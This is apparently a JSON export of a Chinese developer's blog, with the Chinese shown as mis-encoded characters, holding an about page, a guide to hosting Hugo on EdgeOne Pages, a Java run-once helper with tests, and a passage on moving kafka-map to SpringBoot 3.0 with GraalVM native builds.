[{"content":"ğŸ‘‹ å…¨å¹²å·¥ç¨‹å¸ˆï¼Œç›®å‰åœ¨æŸå®‰å…¨å…¬å¸ä»äº‹å®‰å…¨å¼€å‘å·¥ä½œã€‚\nNext Terminal ä½œè€…ã€‚\nNext Terminal æ˜¯ä¸€ä¸ªç®€æ´ã€å®‰å…¨ã€æ˜“ç”¨çš„è¿ç»´å®¡è®¡ç³»ç»Ÿï¼Œæ”¯æŒå¤šç§è¿œç¨‹è®¿é—®åè®®ï¼ŒåŒ…æ‹¬ RDPã€SSHã€VNCã€Telnetã€HTTP ç­‰ï¼Œé€‚ç”¨äºä¼ä¸šçº§è¿ç»´åœºæ™¯ã€‚\nä»¥ä¸‹æ˜¯æˆ‘å¼€æºçš„å‡ ä¸ªé¡¹ç›®ï¼š\nkafka-map ä¸€ä¸ªç¾è§‚ç®€æ´ä¸”å¼ºå¤§çš„kafka webç®¡ç†å·¥å…·ã€‚\n4dnat ä¸€ä¸ªä¸“é—¨ä¸ºç›®çš„åœ°å€è½¬å‘è€ŒæœåŠ¡çš„å·¥å…·ã€‚\n","permalink":"https://www.typesafe.cn/about/","summary":"\u003cp\u003eğŸ‘‹ å…¨å¹²å·¥ç¨‹å¸ˆï¼Œç›®å‰åœ¨æŸå®‰å…¨å…¬å¸ä»äº‹å®‰å…¨å¼€å‘å·¥ä½œã€‚\u003c/p\u003e\n\u003cp\u003eNext Terminal ä½œè€…ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/dushixiang/next-terminal\"\u003eNext Terminal\u003c/a\u003e æ˜¯ä¸€ä¸ªç®€æ´ã€å®‰å…¨ã€æ˜“ç”¨çš„è¿ç»´å®¡è®¡ç³»ç»Ÿï¼Œæ”¯æŒå¤šç§è¿œç¨‹è®¿é—®åè®®ï¼ŒåŒ…æ‹¬ RDPã€SSHã€VNCã€Telnetã€HTTP ç­‰ï¼Œé€‚ç”¨äºä¼ä¸šçº§è¿ç»´åœºæ™¯ã€‚\u003c/p\u003e\n\u003chr\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eä»¥ä¸‹æ˜¯æˆ‘å¼€æºçš„å‡ ä¸ªé¡¹ç›®ï¼š\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/dushixiang/kafka-map\"\u003ekafka-map\u003c/a\u003e\u003c/strong\u003e ä¸€ä¸ªç¾è§‚ç®€æ´ä¸”å¼ºå¤§çš„kafka webç®¡ç†å·¥å…·ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/dushixiang/4dnat\"\u003e4dnat\u003c/a\u003e\u003c/strong\u003e ä¸€ä¸ªä¸“é—¨ä¸ºç›®çš„åœ°å€è½¬å‘è€ŒæœåŠ¡çš„å·¥å…·ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"å…³äº"},{"content":"è‡ªä»è…¾è®¯äº‘å®¢æœç»™æˆ‘æ‰“ç”µè¯è¯´æˆ‘çš„å¤‡æ¡ˆåŸŸåè§£æåˆ°äº†å¢ƒå¤–IPä¸Šè®©æˆ‘æ•´æ”¹ï¼Œå·²ç»è¿‡å»äº†ä¸¤å¹´ã€‚\nå½“æ—¶æˆ‘æŠŠè§£æåˆ° Github Pages çš„åŸŸåæ›´æ”¹åˆ°äº†è½»é‡äº‘ï¼Œå¹¶ä¸”æŠŠ Github Pages æ‰“åŒ…ä¸‹æ¥ä½¿ç”¨ Caddy æ­å»ºäº†é™æ€ç½‘ç«™ï¼Œç”±äºæ›´æ–°ä¸ä¾¿ï¼Œæˆ‘å†ä¹Ÿæ²¡æœ‰æ›´æ–°è¿‡åšå®¢ã€‚\nå‰æ®µæ—¶é—´ç™½å«–äº† EdgeOne å…è´¹ CDN æµ‹è¯•åŠ é€Ÿ Github Pagesï¼Œè¯´å®è¯å¹¶ä¸å¥½ç”¨ã€‚\né¦–å…ˆç¬¬ä¸€æ¬¡è¯·æ±‚å›æºåˆ° Github ç‰¹åˆ«æ…¢ï¼Œå¤§æ¦‚ç‡æ˜¯ç”¨äº†å›½å†…çš„èŠ‚ç‚¹å»è¯·æ±‚ï¼›å…¶æ¬¡ CDN çš„ç¼“å­˜åŠ é€ŸåŠŸèƒ½ï¼Œæˆ‘æ›´æ–°äº†åšå®¢çš„å†…å®¹å°±éœ€è¦æ‰‹åŠ¨æŠŠ CDN çš„ç¼“å­˜å…¨éƒ¨æ¸…ç©ºæ‰è¡Œï¼Œä¸ç¼“å­˜çš„è¯åˆèµ·ä¸åˆ°åŠ é€Ÿçš„ä½œç”¨ã€‚\nä»Šå¤©å¿™é‡Œå·é—²ï¼Œæµ‹è¯•ä¸€ä¸‹EdgeOne Pages æ‰˜ç®¡Hugoåšå®¢ï¼ŒEdgeOne Pages æ˜¯æ”¯æŒ Node.js ç›¸å…³çš„æ¡†æ¶é¢„è®¾ï¼Œæˆ‘ä»¥ä¸ºæ‰˜ç®¡ Hugo åšå®¢ä¼šå¾ˆéº»çƒ¦ï¼Œç»“æœå‘ç°çœŸçš„å¾ˆç®€å•ã€‚\né¦–å…ˆï¼Œä½ è¦å…ˆæŠŠ Hugo æ‰˜ç®¡åˆ° Github Pages ä¸Šï¼Œè¿™æ­¥æ•™ç¨‹å¾ˆå¤šï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ã€‚\nç„¶åï¼Œä½ è¦åœ¨ EdgeOne ä¸Šåˆ›å»ºä¸€ä¸ª Pages é¡¹ç›®ï¼Œé€‰æ‹©ä½ çš„ Github Pages ä»“åº“ï¼Œè®°å¾—åˆ†æ”¯é€‰æ‹©ç¼–è¯‘åæ–‡ä»¶æ‰€åœ¨çš„ gh-pages ç„¶åé€‰æ‹© Other é¢„è®¾ï¼Œå…¶ä»–ä¸éœ€è¦æ”¹å˜ã€‚\næœ€åç‚¹å‡»å¼€å§‹éƒ¨ç½²ï¼Œç­‰å¾…éƒ¨ç½²å®Œæˆå³å¯ã€‚\næ¯æ¬¡æäº¤åï¼ŒGithub Action è‡ªåŠ¨ç¼–è¯‘å‘å¸ƒåœ¨åˆ†æ”¯ gh-pages ä¸Šï¼Œ EdgeOne ä¼šè‡ªåŠ¨æ£€æµ‹åˆ°ä»“åº“ gh-pages åˆ†æ”¯çš„å˜åŒ–ï¼Œæœ€åæ›´æ–°åˆ° EdgeOne Pages ä¸Šã€‚\n","permalink":"https://www.typesafe.cn/posts/hugo-on-edgeone-pages/","summary":"\u003cp\u003eè‡ªä»è…¾è®¯äº‘å®¢æœç»™æˆ‘æ‰“ç”µè¯è¯´æˆ‘çš„å¤‡æ¡ˆåŸŸåè§£æåˆ°äº†å¢ƒå¤–IPä¸Šè®©æˆ‘æ•´æ”¹ï¼Œå·²ç»è¿‡å»äº†ä¸¤å¹´ã€‚\u003c/p\u003e\n\u003cp\u003eå½“æ—¶æˆ‘æŠŠè§£æåˆ° Github Pages çš„åŸŸåæ›´æ”¹åˆ°äº†è½»é‡äº‘ï¼Œå¹¶ä¸”æŠŠ Github Pages æ‰“åŒ…ä¸‹æ¥ä½¿ç”¨ Caddy æ­å»ºäº†é™æ€ç½‘ç«™ï¼Œç”±äºæ›´æ–°ä¸ä¾¿ï¼Œæˆ‘å†ä¹Ÿæ²¡æœ‰æ›´æ–°è¿‡åšå®¢ã€‚\u003c/p\u003e\n\u003cp\u003eå‰æ®µæ—¶é—´ç™½å«–äº† EdgeOne å…è´¹ CDN æµ‹è¯•åŠ é€Ÿ Github Pagesï¼Œè¯´å®è¯å¹¶ä¸å¥½ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆç¬¬ä¸€æ¬¡è¯·æ±‚å›æºåˆ° Github ç‰¹åˆ«æ…¢ï¼Œå¤§æ¦‚ç‡æ˜¯ç”¨äº†å›½å†…çš„èŠ‚ç‚¹å»è¯·æ±‚ï¼›å…¶æ¬¡ CDN çš„ç¼“å­˜åŠ é€ŸåŠŸèƒ½ï¼Œæˆ‘æ›´æ–°äº†åšå®¢çš„å†…å®¹å°±éœ€è¦æ‰‹åŠ¨æŠŠ CDN çš„ç¼“å­˜å…¨éƒ¨æ¸…ç©ºæ‰è¡Œï¼Œä¸ç¼“å­˜çš„è¯åˆèµ·ä¸åˆ°åŠ é€Ÿçš„ä½œç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eä»Šå¤©å¿™é‡Œå·é—²ï¼Œæµ‹è¯•ä¸€ä¸‹EdgeOne Pages æ‰˜ç®¡Hugoåšå®¢ï¼ŒEdgeOne Pages æ˜¯æ”¯æŒ Node.js ç›¸å…³çš„æ¡†æ¶é¢„è®¾ï¼Œæˆ‘ä»¥ä¸ºæ‰˜ç®¡ Hugo åšå®¢ä¼šå¾ˆéº»çƒ¦ï¼Œç»“æœå‘ç°çœŸçš„å¾ˆç®€å•ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œä½ è¦å…ˆæŠŠ Hugo æ‰˜ç®¡åˆ° Github Pages ä¸Šï¼Œè¿™æ­¥æ•™ç¨‹å¾ˆå¤šï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åï¼Œä½ è¦åœ¨ EdgeOne ä¸Šåˆ›å»ºä¸€ä¸ª Pages é¡¹ç›®ï¼Œé€‰æ‹©ä½ çš„ Github Pages ä»“åº“ï¼Œè®°å¾—åˆ†æ”¯é€‰æ‹©ç¼–è¯‘åæ–‡ä»¶æ‰€åœ¨çš„ \u003ccode\u003egh-pages\u003c/code\u003e ç„¶åé€‰æ‹© Other é¢„è®¾ï¼Œå…¶ä»–ä¸éœ€è¦æ”¹å˜ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/edgeone-pages-deploy.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ€åç‚¹å‡»å¼€å§‹éƒ¨ç½²ï¼Œç­‰å¾…éƒ¨ç½²å®Œæˆå³å¯ã€‚\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eæ¯æ¬¡æäº¤åï¼ŒGithub Action è‡ªåŠ¨ç¼–è¯‘å‘å¸ƒåœ¨åˆ†æ”¯ \u003ccode\u003egh-pages\u003c/code\u003e ä¸Šï¼Œ EdgeOne ä¼šè‡ªåŠ¨æ£€æµ‹åˆ°ä»“åº“ \u003ccode\u003egh-pages\u003c/code\u003e åˆ†æ”¯çš„å˜åŒ–ï¼Œæœ€åæ›´æ–°åˆ° EdgeOne Pages ä¸Šã€‚\u003c/p\u003e","title":"ä½¿ç”¨ EdgeOne Pages æ‰˜ç®¡Hugoåšå®¢"},{"content":"æœ€è¿‘ä¸€å¹´æ—¶é—´ä¸€ç›´åœ¨å†™ Golang ï¼Œä¹Ÿç®—æ˜¯å¯¹ Golang æœ‰äº†åˆæ­¥çš„æŒæ¡ï¼Œå†æ¬¡å†™ Java çš„æ—¶å€™å‘ç°æœ‰ç‚¹ç”Ÿç–äº†ï¼Œå†™ä»£ç çš„æ—¶å€™ä¹Ÿä¸è‡ªè§‰ä»£å…¥äº†å†™ Golang çš„æ€ç»´ã€‚\næ­£å¦‚æˆ‘æƒ³è¦åœ¨ Java é‡Œé¢æƒ³è®©æŸä¸€ä¸ªæ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡çš„æ—¶å€™ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº† Golang é‡Œé¢çš„ Once åŠŸèƒ½ã€‚\nsync.Once æ˜¯ Golang çš„ä¸€ä¸ªå¹¶å‘åŸè¯­ï¼Œå®ƒæä¾›äº†ä¸€ç§å®‰å…¨åœ°åœ¨å¤šä¸ª goroutine ä¸­æ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰ä¸€æ¬¡çš„æœºåˆ¶ã€‚\nsync.Once ç±»å‹æœ‰ä¸€ä¸ª Do æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶ç¡®ä¿è¿™ä¸ªå‡½æ•°åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œæ— è®ºæœ‰å¤šå°‘ä¸ª goroutine åŒæ—¶è°ƒç”¨å®ƒã€‚å…·ä½“æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨ Do æ–¹æ³•çš„ goroutine ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œå…¶ä»– goroutine åˆ™ä¼šç­‰å¾…å®ƒå®Œæˆï¼Œç„¶åè¿”å›ç›¸åŒçš„ç»“æœã€‚\nsync.Once å¯ä»¥ç”¨äºä¸€äº›éœ€è¦å…¨å±€åˆå§‹åŒ–çš„åœºæ™¯ï¼Œæ¯”å¦‚åˆå§‹åŒ–é…ç½®ä¿¡æ¯ã€æ•°æ®åº“è¿æ¥ç­‰ã€‚ä½¿ç”¨ sync.Once å¯ä»¥ç¡®ä¿è¿™äº›åˆå§‹åŒ–åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥å®‰å…¨åœ°è¢«å¤šä¸ª goroutine å…±äº«ä½¿ç”¨ã€‚\n\u0026ndash; æ¥è‡ª ChatGPT\nå…¶å®å’Œå•ä¾‹æ¨¡å¼å·®ä¸å¤šï¼Œä½†æˆ‘æƒ³è¦çš„æ˜¯è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Œæˆ‘é­”æ”¹äº†ä¸€ä¸‹ï¼Œç›´æ¥ä¸Šä»£ç å§ã€‚\npackage cn.typesafe.sync; import lombok.SneakyThrows; import java.util.concurrent.Callable; public class Once\u0026lt;T\u0026gt; { private volatile T t = null; @SneakyThrows public T doOnce(Callable\u0026lt;T\u0026gt; action) { if (t == null) { synchronized (this) { if (t == null) { t = action.call(); } } } return t; } } å•å…ƒæµ‹è¯•\npackage cn.typesafe.sync; import cn.typesafe.sync.Once; import org.junit.jupiter.api.Test; import org.wildfly.common.Assert; import java.util.concurrent.*; import java.util.concurrent.atomic.AtomicInteger; public class OnceTest { @Test public void onceTest() { Once\u0026lt;Integer\u0026gt; once = new Once\u0026lt;\u0026gt;(); AtomicInteger count = new AtomicInteger(0); Integer value1 = once.doOnce(count::incrementAndGet); Assert.assertTrue(value1.equals(1)); Integer value2 = once.doOnce(count::incrementAndGet); Assert.assertTrue(value2.equals(1)); } @Test public void onceConcurrentTest() throws InterruptedException { Once\u0026lt;Integer\u0026gt; once = new Once\u0026lt;\u0026gt;(); AtomicInteger count = new AtomicInteger(0); int threadCount = Runtime.getRuntime().availableProcessors() * 2; ExecutorService executorService = Executors.newFixedThreadPool(threadCount); CountDownLatch countDownLatch = new CountDownLatch(threadCount); for (int i = 0; i \u0026lt; threadCount; i++) { executorService.execute(() -\u0026gt; { Integer value1 = once.doOnce(count::incrementAndGet); Assert.assertTrue(value1.equals(1)); countDownLatch.countDown(); }); } countDownLatch.await(); } } ","permalink":"https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/","summary":"\u003cp\u003eæœ€è¿‘ä¸€å¹´æ—¶é—´ä¸€ç›´åœ¨å†™ Golang ï¼Œä¹Ÿç®—æ˜¯å¯¹ Golang æœ‰äº†åˆæ­¥çš„æŒæ¡ï¼Œå†æ¬¡å†™ Java çš„æ—¶å€™å‘ç°æœ‰ç‚¹ç”Ÿç–äº†ï¼Œå†™ä»£ç çš„æ—¶å€™ä¹Ÿä¸è‡ªè§‰ä»£å…¥äº†å†™ Golang çš„æ€ç»´ã€‚\u003c/p\u003e\n\u003cp\u003eæ­£å¦‚æˆ‘æƒ³è¦åœ¨ Java é‡Œé¢æƒ³è®©æŸä¸€ä¸ªæ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡çš„æ—¶å€™ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº† Golang é‡Œé¢çš„ \u003ccode\u003eOnce\u003c/code\u003e åŠŸèƒ½ã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esync.Once\u003c/code\u003e æ˜¯ Golang çš„ä¸€ä¸ªå¹¶å‘åŸè¯­ï¼Œå®ƒæä¾›äº†ä¸€ç§å®‰å…¨åœ°åœ¨å¤šä¸ª goroutine ä¸­æ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰ä¸€æ¬¡çš„æœºåˆ¶ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esync.Once\u003c/code\u003e ç±»å‹æœ‰ä¸€ä¸ª \u003ccode\u003eDo\u003c/code\u003e æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶ç¡®ä¿è¿™ä¸ªå‡½æ•°åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œæ— è®ºæœ‰å¤šå°‘ä¸ª goroutine åŒæ—¶è°ƒç”¨å®ƒã€‚å…·ä½“æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨ Do æ–¹æ³•çš„ goroutine ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œå…¶ä»– goroutine åˆ™ä¼šç­‰å¾…å®ƒå®Œæˆï¼Œç„¶åè¿”å›ç›¸åŒçš„ç»“æœã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esync.Once\u003c/code\u003e å¯ä»¥ç”¨äºä¸€äº›éœ€è¦å…¨å±€åˆå§‹åŒ–çš„åœºæ™¯ï¼Œæ¯”å¦‚åˆå§‹åŒ–é…ç½®ä¿¡æ¯ã€æ•°æ®åº“è¿æ¥ç­‰ã€‚ä½¿ç”¨ sync.Once å¯ä»¥ç¡®ä¿è¿™äº›åˆå§‹åŒ–åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥å®‰å…¨åœ°è¢«å¤šä¸ª goroutine å…±äº«ä½¿ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003e\u0026ndash; æ¥è‡ª ChatGPT\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eå…¶å®å’Œ\u003ccode\u003eå•ä¾‹æ¨¡å¼\u003c/code\u003eå·®ä¸å¤šï¼Œä½†æˆ‘æƒ³è¦çš„æ˜¯è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Œæˆ‘é­”æ”¹äº†ä¸€ä¸‹ï¼Œç›´æ¥ä¸Šä»£ç å§ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e cn.typesafe.sync;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e lombok.SneakyThrows;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.util.concurrent.Callable;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eOnce\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eT\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evolatile\u003c/span\u003e T t \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e@SneakyThrows\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e T \u003cspan style=\"color:#a6e22e\"\u003edoOnce\u003c/span\u003e(Callable\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eT\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e action) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (t \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003esynchronized\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003ethis\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (t \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\tt \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e action.\u003cspan style=\"color:#a6e22e\"\u003ecall\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e t;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå•å…ƒæµ‹è¯•\u003c/p\u003e","title":"åœ¨ Java é‡Œå¦‚ä½•è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Ÿ"},{"content":"2022å¹´11æœˆ24æ—¥ SpringBoot æ­£å¼å‘å¸ƒäº† 3.0 ç‰ˆæœ¬ï¼Œå¸¦æ¥è®¸å¤šæ–°çš„ç‰¹æ€§ï¼Œä½†æˆ‘æœ€å…³å¿ƒçš„è¿˜æ˜¯Javaæ‰“åŒ…æˆåŸç”ŸäºŒè¿›åˆ¶ï¼Œè¿è¡Œæ—¶ä¸å†ä¾èµ–jreç¯å¢ƒï¼Œè¿è¡ŒJavaç¨‹åºå°†å’ŒGoç¨‹åºä¸€æ ·æ–¹ä¾¿ã€‚\nå‡çº§è‡³ SpringBoot 3.0.0 è¯´æ˜¯å°é²œï¼Œä½†æ˜¯æˆ‘ä¸æƒ³å†è¯•ç€æ hello world é‚£ç§å•¥éƒ½æ²¡æœ‰çš„ä¸œè¥¿äº†ï¼Œæ‰¾åˆ°æˆ‘ä¹‹å‰å†™çš„ä¸€ä¸ªJavaå¼€æºé¡¹ç›® kafka-map æ‹¿ä»–å¼€åˆ€ã€‚\nkafka-map æœ¬èº«æ˜¯åŸºäº SpringBoot 2.4.x å¼€å‘çš„ï¼Œsqlite å­˜å‚¨æ•°æ®ï¼Œä¸”å¾ˆä¹…æ²¡æœ‰å¤§çš„æ›´æ–°äº†ï¼Œæƒ³è¦ç›´æ¥å‡çº§åˆ° SpringBoot 3.0.0 æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ Spring Boot 3.0 è¿ç§»æŒ‡å— é¦–å…ˆå‡çº§åˆ°æœ€æ–°2.7.xç‰ˆæœ¬ï¼Œç„¶åå°±å‘ç° service ä¾èµ–å¾ªç¯äº†ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸ä¾èµ–å¾ªç¯ spring.main.allow-circular-references: trueï¼ŒäºŒæ˜¯æ¢³ç†ä¸šåŠ¡é€»è¾‘è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ã€‚ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„å¼€å‘ï¼Œæˆ‘é€‰æ‹©äº†è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚\nSpringBoot 3.0.0 å‡çº§äº†å¾ˆå¤šç»„ä»¶ï¼Œå…¶ä¸­ Jpa ä¾èµ–çš„ Hibernate å‡çº§åˆ°äº† 6.xï¼Œæˆ‘å¯åŠ¨æ—¶åˆé‡åˆ°äº† sqlite æ–¹è¨€æ’ä»¶ä¸å¯ç”¨çš„é—®é¢˜ï¼Œè¿˜å¥½ Hibernate 6.x å·²ç»æ”¯æŒäº† sqliteæ–¹è¨€ï¼Œåˆ‡æ¢åˆ°å®˜æ–¹æ’ä»¶å°±å¥½äº†ã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š\nspring: datasource: url: jdbc:sqlite:data/kafka-map.db driver-class-name: org.sqlite.JDBC jpa: hibernate: ddl-auto: update show-sql: true properties: hibernate: dialect: org.hibernate.community.dialect.SQLiteDialect åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ… æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶è¿˜æ˜¯æœ€æŠ˜è…¾çš„ï¼Œåˆšå¼€å§‹å‚è€ƒGraalVM Native Image Support æŠŠæ‰“åŒ… springboot:build-image å½“æˆäº†æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶äº†ï¼Œè€Œä¸”æ‰“åŒ…çš„è¿‡ç¨‹ä¸­è¿˜é‡åˆ°äº† UnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger è¿™ä¸ªé—®é¢˜ï¼Œæ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚\næ— å¥ˆï¼Œè¿˜æ˜¯ä» hello world å¼€å§‹å­¦èµ·å§ï¼Œæˆ‘é‡æ–°åˆ›å»ºäº†ä¸€ä¸ª SpringBoot3.0.0 é¡¹ç›®ï¼Œå¹¶æ·»åŠ äº† GraalVM Native Support å’Œæˆ‘ç”¨åˆ°çš„ä¸€äº›ç»„ä»¶ã€‚\nç„¶åæˆ‘å°±å‘ç°äº†æ–°çš„å¤§é™†ï¼Œæˆ‘ä¹‹å‰çš„æ–¹å‘é”™äº†ï¼Œæœç„¶æ˜¯æ–¹å‘é”™äº†å†åŠªåŠ›ä¹Ÿæ²¡ç”¨å•Šã€‚\næˆ‘åœ¨è¿™ä¸ªhello worldç¨‹åºä¸­è¯•äº†ä¸€ä¸‹æœç„¶èƒ½è¡Œï¼Œå½“ç„¶æ˜¯éœ€è¦æ‰‹åŠ¨å®‰è£… GraalVM å¹¶ä¸”é…ç½®ç¯å¢ƒå˜é‡çš„ï¼Œåˆ‡æ¢åˆ° graalvm ç¯å¢ƒçš„jdk ã€‚è¯·å‚è€ƒ https://www.graalvm.org/downloads/ çš„æ•™ç¨‹ã€‚\nå¯¹æ¯” hello world ç¨‹åºæˆ‘å‘ç°åœ¨ maven æ’ä»¶ä¸­å¤šäº†ä¸€ä¸ªæ’ä»¶ï¼Œå¤åˆ¶è¿‡å»å®‰è£…ä¸€ä¸‹ã€‚\n\u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.graalvm.buildtools\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;native-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;/plugin\u0026gt; è¿è¡Œæ‰“åŒ…å‘½ä»¤ã€‚\nä¸è¦å¿˜è®°æ¿€æ´» graavm ç¯å¢ƒã€‚\nmvn clean native:compile -Pnative -Dmaven.test.skip=true ç„¶åæ—¶é•¿è¾¾åå‡ 